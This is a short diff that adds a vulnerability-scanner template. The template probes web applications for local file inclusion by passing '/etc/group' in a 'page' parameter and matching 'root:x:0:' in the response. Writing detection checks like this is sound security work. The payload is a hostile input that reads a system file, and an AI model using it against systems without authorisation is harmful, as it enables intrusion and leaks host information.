@@ -1,0 +1,20 @@
+id: lfi4-13
+name: 'System file /etc/group via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/group via page'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '/etc/group'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:'
